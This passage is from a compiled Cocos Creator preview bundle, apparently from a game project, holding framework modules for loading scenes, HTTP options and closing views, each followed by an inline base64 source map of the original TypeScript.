0ZXMuaHRtbFxyXG4vLyAgLSBbRW5nbGlzaF0gaHR0cDovL3d3dy5jb2NvczJkLXgub3JnL2RvY3MvY3JlYXRvci9tYW51YWwvZW4vc2NyaXB0aW5nL3JlZmVyZW5jZS9hdHRyaWJ1dGVzLmh0bWxcclxuLy8gTGVhcm4gbGlmZS1jeWNsZSBjYWxsYmFja3M6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL2xpZmUtY3ljbGUtY2FsbGJhY2tzLmh0bWxcclxuLy8gIC0gW0VuZ2xpc2hdIGh0dHA6Ly93d3cuY29jb3MyZC14Lm9yZy9kb2NzL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy9saWZlLWN5Y2xlLWNhbGxiYWNrcy5odG1sXHJcblxyXG5pbXBvcnQge0lDb21tYW5kfSBmcm9tIFwiLi9JQ29tbWFuZFwiO1xyXG5pbXBvcnQgTGlmZUN5Y2xlIGZyb20gXCIuLi9jb21wb25lbnQvTGlmZUN5Y2xlXCI7XHJcbmltcG9ydCBGYWNhZGUgZnJvbSBcIi4vRmFjYWRlXCI7XHJcblxyXG5jb25zdCB7Y2NjbGFzcywgcHJvcGVydHl9ID0gY2MuX2RlY29yYXRvcjtcclxuXHJcbkBjY2NsYXNzKFwiT3BlblZpZXdDb21tYW5kXCIpXHJcbmV4cG9ydCBkZWZhdWx0IGNsYXNzIE9wZW5WaWV3Q29tbWFuZCBpbXBsZW1lbnRzIElDb21tYW5kIHtcclxuXHJcbiAgICBhc3luYyBleGVjdXRlKC4uLmFyZ3MpOlByb21pc2V7XHJcbiAgICAgICAgcmV0dXJuIG5ldyBQcm9taXNlKGFzeW5jKHJlc29sdmUsIHJlamVjdCkgPT4ge1xyXG4gICAgICAgICAgICBsZXQgcHJlZmFiTmFtZTpzdHJpbmcgPSBhcmdzWzBdO1xyXG4gICAgICAgICAgICBpZihGYWNhZGUuY2FudmFzTm9kZS5nZXRDaGlsZEJ5TmFtZShwcmVmYWJOYW1lLnN1YnN0cmluZyhwcmVmYWJOYW1lLmxhc3RJbmRleE9mKFwiL1wiKSsxKSkpe1xyXG4gICAgICAgICAgICAgICAgY29uc29sZS5lcnJvcihg5q2k56qX5Y+j5bey5omT5byAPT09PiR7cHJlZmFiTmFtZX1gLCBcIuaIluiAheaYr3ByZWZhYuagueiKgueCueWQjeensOS4juWFtuS7lnByZWZhYuagueiKgueCueWQjeensOWGsueqgS4uLuinhOWIme+8mnByZWZhYuWQjeensOimgeS4juivpXByZWZhYuagueiKgueCueWQjeensOS4gOiHtOOAglwiKTtcclxuICAgICAgICAgICAgICAgIHJlamVjdCgpO1xyXG4gICAgICAgICAgICB9ZWxzZSB7XHJcbiAgICAgICAgICAgICAgICBsZXQgcHJlZmFiID0gYXdhaXQgY2MubG9hZGVyLmxvYWRSZXNBd2FpdChwcmVmYWJOYW1lLCBjYy5QcmVmYWIpO1xyXG4gICAgICAgICAgICAgICAgbGV0IG5vZGU6Y2MuTm9kZSA9IGNjLmluc3RhbnRpYXRlKHByZWZhYik7XHJcbiAgICAgICAgICAgICAgICBub2RlLnNldFBhcmVudChGYWNhZGUuY2FudmFzTm9kZSk7XHJcbiAgICAgICAgICAgICAgICByZXNvbHZlKG5vZGUpO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgfSk7XHJcbiAgICB9XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/facade/LoadSceneCommand.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '4fde6oupepCYrYBAsbalMnm', 'LoadSceneCommand');
// framework/facade/LoadSceneCommand.ts

// Learn TypeScript:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/typescript.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/typescript.html
// Learn Attribute:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/reference/attributes.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/reference/attributes.html
// Learn life-cycle callbacks:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/life-cycle-callbacks.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/life-cycle-callbacks.html
Object.defineProperty(exports, "__esModule", { value: true });
exports.getCurrentSceneName = void 0;
var Facade_1 = require("./Facade");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var currentSceneName = "WelcomeScene";
var blockInputNode = null;
var LoadSceneCommand = /** @class */ (function () {
    function LoadSceneCommand() {
    }
    LoadSceneCommand.prototype.execute = function () {
        var args = [];
        for (var _i = 0; _i < arguments.length; _i++) {
            args[_i] = arguments[_i];
        }
        return __awaiter(this, void 0, Promise, function () {
            var _this = this;
            return __generator(this, function (_a) {
                return [2 /*return*/, new Promise(function (resolve, reject) { return __awaiter(_this, void 0, void 0, function () {
                        var sceneName, prefab, deletes, node;
                        return __generator(this, function (_a) {
                            switch (_a.label) {
                                case 0:
                                    sceneName = args[0];
                                    console.log(sceneName, "sceneName.");
                                    if (blockInputNode == null) {
                                        blockInputNode = new cc.Node();
                                        blockInputNode.zIndex = cc.macro.MAX_ZINDEX;
                                        blockInputNode.addComponent(cc.BlockInputEvents);
                                        blockInputNode.setContentSize(cc.view.getVisibleSize());
                                        blockInputNode.setPosition(cc.view.getViewportRect().center);
                                        blockInputNode.setParent(cc.director.getScene());
                                    }
                                    blockInputNode.active = true;
                                    return [4 /*yield*/, cc.loader.loadResAwait("prefab/" + sceneName, cc.Prefab)];
                                case 1:
                                    prefab = _a.sent();
                                    console.log("加载场景成功", sceneName);
                                    deletes = Facade_1.default.canvasNode.children.filter(function (value) { return value.getComponent(cc.Camera) == null; });
                                    deletes.forEach(function (value) {
                                        // value.removeFromParent(true);
                                        value.destroy();
                                    });
                                    console.log("清理场景成功.");
                                    blockInputNode.active = false;
                                    node = cc.instantiate(prefab);
                                    node.setParent(Facade_1.default.canvasNode);
                                    currentSceneName = sceneName;
                                    console.log("创建场景成功.", sceneName);
                                    resolve(node);
                                    return [2 /*return*/];
                            }
                        });
                    }); })];
            });
        });
    };
    LoadSceneCommand = __decorate([
        ccclass("LoadSceneCommand")
    ], LoadSceneCommand);
    return LoadSceneCommand;
}());
exports.default = LoadSceneCommand;
function getCurrentSceneName() {
    return currentSceneName;
}
exports.getCurrentSceneName = getCurrentSceneName;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvZmFjYWRlL0xvYWRTY2VuZUNvbW1hbmQudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7O0FBQUEsb0JBQW9CO0FBQ3BCLGlGQUFpRjtBQUNqRix5RkFBeUY7QUFDekYsbUJBQW1CO0FBQ25CLDJGQUEyRjtBQUMzRixtR0FBbUc7QUFDbkcsOEJBQThCO0FBQzlCLDJGQUEyRjtBQUMzRixtR0FBbUc7OztBQUduRyxtQ0FBOEI7QUFFeEIsSUFBQSxLQUFzQixFQUFFLENBQUMsVUFBVSxFQUFsQyxPQUFPLGFBQUEsRUFBRSxRQUFRLGNBQWlCLENBQUM7QUFFMUMsSUFBSSxnQkFBZ0IsR0FBVSxjQUFjLENBQUM7QUFFN0MsSUFBSSxjQUFjLEdBQVcsSUFBSSxDQUFDO0FBR2xDO0lBQUE7SUFxQ0EsQ0FBQztJQW5DUyxrQ0FBTyxHQUFiO1FBQWUsY0FBTzthQUFQLFVBQU8sRUFBUCxxQkFBTyxFQUFQLElBQU87WUFBUCx5QkFBTzs7dUNBQUUsT0FBTzs7O2dCQUMzQixzQkFBTyxJQUFJLE9BQU8sQ0FBQyxVQUFNLE9BQU8sRUFBRSxNQUFNOzs7OztvQ0FLaEMsU0FBUyxHQUFHLElBQUksQ0FBQyxDQUFDLENBQUMsQ0FBQztvQ0FDeEIsT0FBTyxDQUFDLEdBQUcsQ0FBQyxTQUFTLEVBQUUsWUFBWSxDQUFDLENBQUM7b0NBQ3JDLElBQUksY0FBYyxJQUFJLElBQUksRUFBQzt3Q0FDdkIsY0FBYyxHQUFHLElBQUksRUFBRSxDQUFDLElBQUksRUFBRSxDQUFDO3dDQUMvQixjQUFjLENBQUMsTUFBTSxHQUFHLEVBQUUsQ0FBQyxLQUFLLENBQUMsVUFBVSxDQUFDO3dDQUM1QyxjQUFjLENBQUMsWUFBWSxDQUFDLEVBQUUsQ0FBQyxnQkFBZ0IsQ0FBQyxDQUFDO3dDQUNqRCxjQUFjLENBQUMsY0FBYyxDQUFDLEVBQUUsQ0FBQyxJQUFJLENBQUMsY0FBYyxFQUFFLENBQUMsQ0FBQzt3Q0FDeEQsY0FBYyxDQUFDLFdBQVcsQ0FBQyxFQUFFLENBQUMsSUFBSSxDQUFDLGVBQWUsRUFBRSxDQUFDLE1BQU0sQ0FBQyxDQUFDO3dDQUM3RCxjQUFjLENBQUMsU0FBUyxDQUFDLEVBQUUsQ0FBQyxRQUFRLENBQUMsUUFBUSxFQUFFLENBQUMsQ0FBQztxQ0FDcEQ7b0NBRUQsY0FBYyxDQUFDLE1BQU0sR0FBRyxJQUFJLENBQUM7b0NBQ2hCLHFCQUFNLEVBQUUsQ0FBQyxNQUFNLENBQUMsWUFBWSxDQUFDLFNBQVMsR0FBQyxTQUFTLEVBQUUsRUFBRSxDQUFDLE1BQU0sQ0FBQyxFQUFBOztvQ0FBckUsTUFBTSxHQUFHLFNBQTREO29DQUN6RSxPQUFPLENBQUMsR0FBRyxDQUFDLFFBQVEsRUFBRSxTQUFTLENBQUMsQ0FBQztvQ0FFN0IsT0FBTyxHQUFHLGdCQUFNLENBQUMsVUFBVSxDQUFDLFFBQVEsQ0FBQyxNQUFNLENBQUMsVUFBQSxLQUFLLElBQUksT0FBQSxLQUFLLENBQUMsWUFBWSxDQUFDLEVBQUUsQ0FBQyxNQUFNLENBQUMsSUFBSSxJQUFJLEVBQXJDLENBQXFDLENBQUMsQ0FBQztvQ0FDaEcsT0FBTyxDQUFDLE9BQU8sQ0FBQyxVQUFBLEtBQUs7d0NBQ2pCLGdDQUFnQzt3Q0FDaEMsS0FBSyxDQUFDLE9BQU8sRUFBRSxDQUFDO29DQUNwQixDQUFDLENBQUMsQ0FBQztvQ0FDSCxPQUFPLENBQUMsR0FBRyxDQUFDLFNBQVMsQ0FBQyxDQUFDO29DQUN2QixjQUFjLENBQUMsTUFBTSxHQUFHLEtBQUssQ0FBQztvQ0FDMUIsSUFBSSxHQUFXLEVBQUUsQ0FBQyxXQUFXLENBQUMsTUFBTSxDQUFDLENBQUM7b0NBQzFDLElBQUksQ0FBQyxTQUFTLENBQUMsZ0JBQU0sQ0FBQyxVQUFVLENBQUMsQ0FBQztvQ0FDbEMsZ0JBQWdCLEdBQUcsU0FBUyxDQUFDO29DQUM3QixPQUFPLENBQUMsR0FBRyxDQUFDLFNBQVMsRUFBRSxTQUFTLENBQUMsQ0FBQztvQ0FDbEMsT0FBTyxDQUFDLElBQUksQ0FBQyxDQUFDOzs7O3lCQUNqQixDQUFDLEVBQUM7OztLQUNOO0lBcENnQixnQkFBZ0I7UUFEcEMsT0FBTyxDQUFDLGtCQUFrQixDQUFDO09BQ1AsZ0JBQWdCLENBcUNwQztJQUFELHVCQUFDO0NBckNELEFBcUNDLElBQUE7a0JBckNvQixnQkFBZ0I7QUF1Q3JDLFNBQWdCLG1CQUFtQjtJQUMvQixPQUFPLGdCQUFnQixDQUFDO0FBQzVCLENBQUM7QUFGRCxrREFFQyIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIi8vIExlYXJuIFR5cGVTY3JpcHQ6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL3R5cGVzY3JpcHQuaHRtbFxyXG4vLyAgLSBbRW5nbGlzaF0gaHR0cDovL3d3dy5jb2NvczJkLXgub3JnL2RvY3MvY3JlYXRvci9tYW51YWwvZW4vc2NyaXB0aW5nL3R5cGVzY3JpcHQuaHRtbFxyXG4vLyBMZWFybiBBdHRyaWJ1dGU6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL3JlZmVyZW5jZS9hdHRyaWJ1dGVzLmh0bWxcclxuLy8gIC0gW0VuZ2xpc2hdIGh0dHA6Ly93d3cuY29jb3MyZC14Lm9yZy9kb2NzL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy9yZWZlcmVuY2UvYXR0cmlidXRlcy5odG1sXHJcbi8vIExlYXJuIGxpZmUtY3ljbGUgY2FsbGJhY2tzOlxyXG4vLyAgLSBbQ2hpbmVzZV0gaHR0cDovL2RvY3MuY29jb3MuY29tL2NyZWF0b3IvbWFudWFsL3poL3NjcmlwdGluZy9saWZlLWN5Y2xlLWNhbGxiYWNrcy5odG1sXHJcbi8vICAtIFtFbmdsaXNoXSBodHRwOi8vd3d3LmNvY29zMmQteC5vcmcvZG9jcy9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvbGlmZS1jeWNsZS1jYWxsYmFja3MuaHRtbFxyXG5cclxuaW1wb3J0IHtJQ29tbWFuZH0gZnJvbSBcIi4vSUNvbW1hbmRcIjtcclxuaW1wb3J0IEZhY2FkZSBmcm9tIFwiLi9GYWNhZGVcIjtcclxuXHJcbmNvbnN0IHtjY2NsYXNzLCBwcm9wZXJ0eX0gPSBjYy5fZGVjb3JhdG9yO1xyXG5cclxubGV0IGN1cnJlbnRTY2VuZU5hbWU6c3RyaW5nID0gXCJXZWxjb21lU2NlbmVcIjtcclxuXHJcbmxldCBibG9ja0lucHV0Tm9kZTpjYy5Ob2RlID0gbnVsbDtcclxuXHJcbkBjY2NsYXNzKFwiTG9hZFNjZW5lQ29tbWFuZFwiKVxyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBMb2FkU2NlbmVDb21tYW5kIGltcGxlbWVudHMgSUNvbW1hbmQge1xyXG5cclxuICAgIGFzeW5jIGV4ZWN1dGUgKC4uLmFyZ3MpOlByb21pc2V7XHJcbiAgICAgICAgcmV0dXJuIG5ldyBQcm9taXNlKGFzeW5jKHJlc29sdmUsIHJlamVjdCkgPT4ge1xyXG4gICAgICAgICAgICAvKiog55Sx5LqOY29jb3PliIfmjaLlnLrmma/lnKjpg6jliIZhbmRyb2lk5omL5py65LiK5Lya6buR5bGP5LiA5LiL77yM5omA5Lul5Yqg6L295Zy65pmv5pS55Li65Yqg6L295a+55bqUcHJlZmFiICovXHJcbiAgICAgICAgICAgIC8qY2MuZGlyZWN0b3IubG9hZFNjZW5lKHNjZW5lTmFtZSwgZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICAgICAgcmVzb2x2ZSgpO1xyXG4gICAgICAgICAgICB9KSovXHJcbiAgICAgICAgICAgIGxldCBzY2VuZU5hbWUgPSBhcmdzWzBdO1xyXG4gICAgICAgICAgICBjb25zb2xlLmxvZyhzY2VuZU5hbWUsIFwic2NlbmVOYW1lLlwiKTtcclxuICAgICAgICAgICAgaWYgKGJsb2NrSW5wdXROb2RlID09IG51bGwpe1xyXG4gICAgICAgICAgICAgICAgYmxvY2tJbnB1dE5vZGUgPSBuZXcgY2MuTm9kZSgpO1xyXG4gICAgICAgICAgICAgICAgYmxvY2tJbnB1dE5vZGUuekluZGV4ID0gY2MubWFjcm8uTUFYX1pJTkRFWDtcclxuICAgICAgICAgICAgICAgIGJsb2NrSW5wdXROb2RlLmFkZENvbXBvbmVudChjYy5CbG9ja0lucHV0RXZlbnRzKTtcclxuICAgICAgICAgICAgICAgIGJsb2NrSW5wdXROb2RlLnNldENvbnRlbnRTaXplKGNjLnZpZXcuZ2V0VmlzaWJsZVNpemUoKSk7XHJcbiAgICAgICAgICAgICAgICBibG9ja0lucHV0Tm9kZS5zZXRQb3NpdGlvbihjYy52aWV3LmdldFZpZXdwb3J0UmVjdCgpLmNlbnRlcik7XHJcbiAgICAgICAgICAgICAgICBibG9ja0lucHV0Tm9kZS5zZXRQYXJlbnQoY2MuZGlyZWN0b3IuZ2V0U2NlbmUoKSk7XHJcbiAgICAgICAgICAgIH1cclxuXHJcbiAgICAgICAgICAgIGJsb2NrSW5wdXROb2RlLmFjdGl2ZSA9IHRydWU7XHJcbiAgICAgICAgICAgIGxldCBwcmVmYWIgPSBhd2FpdCBjYy5sb2FkZXIubG9hZFJlc0F3YWl0KFwicHJlZmFiL1wiK3NjZW5lTmFtZSwgY2MuUHJlZmFiKTtcclxuICAgICAgICAgICAgY29uc29sZS5sb2coXCLliqDovb3lnLrmma/miJDlip9cIiwgc2NlbmVOYW1lKTtcclxuICAgICAgICAgICAgLyoqIOWFiOaKiuWcuuaZr+S4iueahOi1hOa6kOmDveW5suaOiemZpOS6huaRhOWDj+acuiAqL1xyXG4gICAgICAgICAgICBsZXQgZGVsZXRlcyA9IEZhY2FkZS5jYW52YXNOb2RlLmNoaWxkcmVuLmZpbHRlcih2YWx1ZSA9PiB2YWx1ZS5nZXRDb21wb25lbnQoY2MuQ2FtZXJhKSA9PSBudWxsKTtcclxuICAgICAgICAgICAgZGVsZXRlcy5mb3JFYWNoKHZhbHVlID0+IHtcclxuICAgICAgICAgICAgICAgIC8vIHZhbHVlLnJlbW92ZUZyb21QYXJlbnQodHJ1ZSk7XHJcbiAgICAgICAgICAgICAgICB2YWx1ZS5kZXN0cm95KCk7XHJcbiAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICBjb25zb2xlLmxvZyhcIua4heeQhuWcuuaZr+aIkOWKny5cIik7XHJcbiAgICAgICAgICAgIGJsb2NrSW5wdXROb2RlLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgICAgICBsZXQgbm9kZTpjYy5Ob2RlID0gY2MuaW5zdGFudGlhdGUocHJlZmFiKTtcclxuICAgICAgICAgICAgbm9kZS5zZXRQYXJlbnQoRmFjYWRlLmNhbnZhc05vZGUpO1xyXG4gICAgICAgICAgICBjdXJyZW50U2NlbmVOYW1lID0gc2NlbmVOYW1lO1xyXG4gICAgICAgICAgICBjb25zb2xlLmxvZyhcIuWIm+W7uuWcuuaZr+aIkOWKny5cIiwgc2NlbmVOYW1lKTtcclxuICAgICAgICAgICAgcmVzb2x2ZShub2RlKTtcclxuICAgICAgICB9KTtcclxuICAgIH1cclxufVxyXG5cclxuZXhwb3J0IGZ1bmN0aW9uIGdldEN1cnJlbnRTY2VuZU5hbWUoKTpzdHJpbmcge1xyXG4gICAgcmV0dXJuIGN1cnJlbnRTY2VuZU5hbWU7XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/http/HttpOption.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '9aa190e59hJS45MuYWui0Ak', 'HttpOption');
// framework/http/HttpOption.ts

Object.defineProperty(exports, "__esModule", { value: true });
exports.HttpOption = void 0;
var HttpOption = /** @class */ (function () {
    function HttpOption() {
        this.host = null;
        this.port = null;
        this.timeout = null;
        this.cookieKey = null;
        this.headers = new Map();
    }
    return HttpOption;
}());
exports.HttpOption = HttpOption;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvaHR0cC9IdHRwT3B0aW9uLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7Ozs7O0FBQUE7SUFBQTtRQUNJLFNBQUksR0FBVSxJQUFJLENBQUM7UUFDbkIsU0FBSSxHQUFVLElBQUksQ0FBQztRQUNuQixZQUFPLEdBQVUsSUFBSSxDQUFDO1FBQ3RCLGNBQVMsR0FBVSxJQUFJLENBQUM7UUFDeEIsWUFBTyxHQUFHLElBQUksR0FBRyxFQUFlLENBQUM7SUFDckMsQ0FBQztJQUFELGlCQUFDO0FBQUQsQ0FOQSxBQU1DLElBQUE7QUFOWSxnQ0FBVSIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbImV4cG9ydCBjbGFzcyBIdHRwT3B0aW9ue1xyXG4gICAgaG9zdDpzdHJpbmcgPSBudWxsO1xyXG4gICAgcG9ydDpudW1iZXIgPSBudWxsO1xyXG4gICAgdGltZW91dDpudW1iZXIgPSBudWxsO1xyXG4gICAgY29va2llS2V5OnN0cmluZyA9IG51bGw7XHJcbiAgICBoZWFkZXJzID0gbmV3IE1hcDxzdHJpbmcsIGFueT4oKTtcclxufSJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/facade/CloseViewCommand.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'b427fLK8OtPeZpFZCOu+9Mi', 'CloseViewCommand');
// framework/facade/CloseViewCommand.ts

// Learn TypeScript:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/typescript.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/typescript.html
// Learn Attribute:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/reference/attributes.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/reference/attributes.html
// Learn life-cycle callbacks:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/life-cycle-callbacks.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/life-cycle-callbacks.html
Object.defineProperty(exports, "__esModule", { value: true });
var Facade_1 = require("./Facade");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var CloseViewCommand = /** @class */ (function () {
    function CloseViewCommand() {
    }
    CloseViewCommand.prototype.execute = function () {
        var args = [];
        for (var _i = 0; _i < arguments.length; _i++) {
            args[_i] = arguments[_i];
        }
        return __awaiter(this, void 0, Promise, function () {
            return __generator(this, function (_a) {
                return [2 /*return*/, new Promise(function (resolve, reject) {
                        var node = args[0];
                        if (typeof node == "string") {
                            node = Facade_1.default.canvasNode.getChildByName(node);
                        }
                        if (node) {
                            node.destroy();
                        }
                        resolve();
                    })];
            });
        });
    };
    CloseViewCommand = __decorate([
        ccclass("CloseViewCommand")
    ], CloseViewCommand);
    return CloseViewCommand;
}());
exports.default = CloseViewCommand;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvZmFjYWRlL0Nsb3NlVmlld0NvbW1hbmQudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7O0FBQUEsb0JBQW9CO0FBQ3BCLGlGQUFpRjtBQUNqRix5RkFBeUY7QUFDekYsbUJBQW1CO0FBQ25CLDJGQUEyRjtBQUMzRixtR0FBbUc7QUFDbkcsOEJBQThCO0FBQzlCLDJGQUEyRjtBQUMzRixtR0FBbUc7O0FBR25HLG1DQUE4QjtBQUV4QixJQUFBLEtBQXNCLEVBQUUsQ0FBQyxVQUFVLEVBQWxDLE9BQU8sYUFBQSxFQUFFLFFBQVEsY0FBaUIsQ0FBQztBQUcxQztJQUFBO0lBY0EsQ0FBQztJQVpTLGtDQUFPLEdBQWI7UUFBZSxjQUFPO2FBQVAsVUFBTyxFQUFQLHFCQUFPLEVBQVAsSUFBTztZQUFQLHlCQUFPOzt1Q0FBRSxPQUFPOztnQkFDM0Isc0JBQU8sSUFBSSxPQUFPLENBQUMsVUFBQyxPQUFPLEVBQUUsTUFBTTt3QkFDL0IsSUFBSSxJQUFJLEdBQUcsSUFBSSxDQUFDLENBQUMsQ0FBQyxDQUFDO3dCQUNuQixJQUFJLE9BQU8sSUFBSSxJQUFJLFFBQVEsRUFBQzs0QkFDeEIsSUFBSSxHQUFHLGdCQUFNLENBQUMsVUFBVSxDQUFDLGNBQWMsQ0FBQyxJQUFJLENBQUMsQ0FBQzt5QkFDakQ7d0JBQ0QsSUFBSSxJQUFJLEVBQUM7NEJBQ0wsSUFBSSxDQUFDLE9BQU8sRUFBRSxDQUFDO3lCQUNsQjt3QkFDRCxPQUFPLEVBQUUsQ0FBQztvQkFDZCxDQUFDLENBQUMsRUFBQzs7O0tBQ047SUFiZ0IsZ0JBQWdCO1FBRHBDLE9BQU8sQ0FBQyxrQkFBa0IsQ0FBQztPQUNQLGdCQUFnQixDQWNwQztJQUFELHVCQUFDO0NBZEQsQUFjQyxJQUFBO2tCQWRvQixnQkFBZ0IiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyIvLyBMZWFybiBUeXBlU2NyaXB0OlxyXG4vLyAgLSBbQ2hpbmVzZV0gaHR0cDovL2RvY3MuY29jb3MuY29tL2NyZWF0b3IvbWFudWFsL3poL3NjcmlwdGluZy90eXBlc2NyaXB0Lmh0bWxcclxuLy8gIC0gW0VuZ2xpc2hdIGh0dHA6Ly93d3cuY29jb3MyZC14Lm9yZy9kb2NzL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy90eXBlc2NyaXB0Lmh0bWxcclxuLy8gTGVhcm4gQXR0cmlidXRlOlxyXG4vLyAgLSBbQ2hpbmVzZV0gaHR0cDovL2RvY3MuY29jb3MuY29tL2NyZWF0b3IvbWFudWFsL3poL3NjcmlwdGluZy9yZWZlcmVuY2UvYXR0cmlidXRlcy5odG1sXHJcbi8vICAtIFtFbmdsaXNoXSBodHRwOi8vd3d3LmNvY29zMmQteC5vcmcvZG9jcy9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvcmVmZXJlbmNlL2F0dHJpYnV0ZXMuaHRtbFxyXG4vLyBMZWFybiBsaWZlLWN5Y2xlIGNhbGxiYWNrczpcclxuLy8gIC0gW0NoaW5lc2VdIGh0dHA6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC96aC9zY3JpcHRpbmcvbGlmZS1jeWNsZS1jYWxsYmFja3MuaHRtbFxyXG4vLyAgLSBbRW5nbGlzaF0gaHR0cDovL3d3dy5jb2NvczJkLXgub3JnL2RvY3MvY3JlYXRvci9tYW51YWwvZW4vc2NyaXB0aW5nL2xpZmUtY3ljbGUtY2FsbGJhY2tzLmh0bWxcclxuXHJcbmltcG9ydCB7SUNvbW1hbmR9IGZyb20gXCIuL0lDb21tYW5kXCI7XHJcbmltcG9ydCBGYWNhZGUgZnJvbSBcIi4vRmFjYWRlXCI7XHJcblxyXG5jb25zdCB7Y2NjbGFzcywgcHJvcGVydHl9ID0gY2MuX2RlY29yYXRvcjtcclxuXHJcbkBjY2NsYXNzKFwiQ2xvc2VWaWV3Q29tbWFuZFwiKVxyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBDbG9zZVZpZXdDb21tYW5kIGltcGxlbWVudHMgSUNvbW1hbmQge1xyXG5cclxuICAgIGFzeW5jIGV4ZWN1dGUgKC4uLmFyZ3MpOlByb21pc2V7XHJcbiAgICAgICAgcmV0dXJuIG5ldyBQcm9taXNlKChyZXNvbHZlLCByZWplY3QpID0+IHtcclxuICAgICAgICAgICAgbGV0IG5vZGUgPSBhcmdzWzBdO1xyXG4gICAgICAgICAgICBpZiAodHlwZW9mIG5vZGUgPT0gXCJzdHJpbmdcIil7XHJcbiAgICAgICAgICAgICAgICBub2RlID0gRmFjYWRlLmNhbnZhc05vZGUuZ2V0Q2hpbGRCeU5hbWUobm9kZSk7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgaWYgKG5vZGUpe1xyXG4gICAgICAgICAgICAgICAgbm9kZS5kZXN0cm95KCk7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgcmVzb2x2ZSgpO1xyXG4